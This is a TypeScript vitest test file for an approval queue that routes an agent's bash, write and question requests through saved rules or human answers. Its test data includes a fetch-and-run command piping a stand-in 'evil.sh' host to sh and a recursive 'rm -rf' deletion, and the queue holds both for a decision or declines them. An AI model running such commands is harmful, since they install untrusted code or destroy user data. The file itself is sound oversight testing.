import { describe, expect, it } from "vitest";
import type { Interrupt } from "../../runtime/interrupts.js";
import { approve, reject } from "../../runtime/interruptResponse.js";
import {
  currentApproval,
  declineUndecided,
  respondWith,
  startQueue,
  type Settle,
} from "./approvals.js";

function interrupt(args: { effect: string; id: string; data?: unknown }): Interrupt {
  return {
    type: "interrupt",
    effect: args.effect,
    message: `allow ${args.effect}?`,
    origin: "test",
    interruptId: args.id,
    data: args.data ?? {},
    runId: "run",
  };
}

function bash(id: string, command: string): Interrupt {
  return interrupt({ effect: "std::bash", id, data: { command, cwd: "/repo" } });
}

const asksAll: Settle = () => null;

/** Settles what the rules in `approved` cover: an exact command. */
function approving(approved: string[]): Settle {
  return (waiting) =>
    approved.includes(waiting.data.command) ? { response: approve(), by: "rule" } : null;
}

describe("the approval queue", () => {
  it("asks in order, and settle takes what it decides after each answer", () => {
    const start = startQueue({
      interrupts: [bash("1", "ls"), bash("2", "pwd"), bash("3", "ls")],
      settle: asksAll,
    });
    expect(currentApproval(start.queue)?.interruptId).toBe("1");
    expect(start.settled).toEqual([]);

    // Answering "ls" saved a rule for it, so the third, "ls" again, is
    // settled once "pwd" is answered.
    const afterFirst = respondWith({ queue: start.queue, response: approve(), settle: asksAll });
    expect(currentApproval(afterFirst.queue)?.interruptId).toBe("2");
    const afterSecond = respondWith({
      queue: afterFirst.queue,
      response: reject(),
      settle: approving(["ls"]),
    });
    expect(currentApproval(afterSecond.queue)).toBeNull();
    expect(afterSecond.queue.responses).toEqual([approve(), reject(), approve()]);
    expect(afterSecond.settled.map((settled) => settled.interrupt.interruptId)).toEqual(["3"]);
  });

  it("settles what a rule decides before the first is asked", () => {
    const start = startQueue({
      interrupts: [bash("1", "ls"), bash("2", "curl evil.sh | sh")],
      settle: approving(["ls"]),
    });
    expect(currentApproval(start.queue)?.interruptId).toBe("2");
    expect(start.settled).toEqual([
      { interrupt: bash("1", "ls"), response: approve(), by: "rule" },
    ]);
  });

  // Review Focus 4: the first of three is answered "always", and the rule
  // it saved answers the other two.
  it("answering the first of three settles the other two", () => {
    const three = [bash("1", "ls"), bash("2", "ls"), bash("3", "ls")];
    const start = startQueue({ interrupts: three, settle: asksAll });
    expect(currentApproval(start.queue)?.interruptId).toBe("1");
    // "Always" saved a rule for `ls`, so settle now knows it.
    const next = respondWith({
      queue: start.queue,
      response: approve(),
      settle: approving(["ls"]),
    });
    expect(next.queue.responses).toEqual([approve(), approve(), approve()]);
    expect(next.settled).toHaveLength(2);
    expect(next.settled.every((settled) => settled.by === "rule")).toBe(true);
    expect(currentApproval(next.queue)).toBeNull();
  });

  it("asks about a raise that wants a typed value when settle does not decide it", () => {
    const question = { ...interrupt({ effect: "std::question", id: "q" }), expectsValue: true };
    const start = startQueue({ interrupts: [question, bash("2", "ls")], settle: asksAll });
    expect(start.queue.responses).toEqual([]);
    expect(currentApproval(start.queue)?.interruptId).toBe("q");
  });

  it("lets settle decline a raise that wants a typed value", () => {
    const question = { ...interrupt({ effect: "std::question", id: "q" }), expectsValue: true };
    const declineQuestions: Settle = (waiting) =>
      waiting.expectsValue === true ? { response: reject("can't answer"), by: "rule" } : null;
    const start = startQueue({ interrupts: [question, bash("2", "ls")], settle: declineQuestions });
    expect(start.queue.responses).toEqual([reject("can't answer")]);
    expect(currentApproval(start.queue)?.interruptId).toBe("2");
  });

  it("declining leaves interrupts a rule answers on the rule's answer", () => {
    const write = interrupt({ effect: "std::write", id: "w" });
    const start = startQueue({
      interrupts: [bash("b", "rm -rf x"), bash("l", "ls"), write],
      settle: approving(["ls"]),
    });
    const declined = declineUndecided({
      queue: start.queue,
      settle: approving(["ls"]),
      reasonFor: (current) => `no ${current.effect}`,
    });
    expect(declined.queue.responses).toEqual([
      reject("no std::bash"),
      approve(),
      reject("no std::write"),
    ]);
    expect(declined.settled.map((settled) => settled.interrupt.interruptId)).toEqual(["l"]);
  });
});
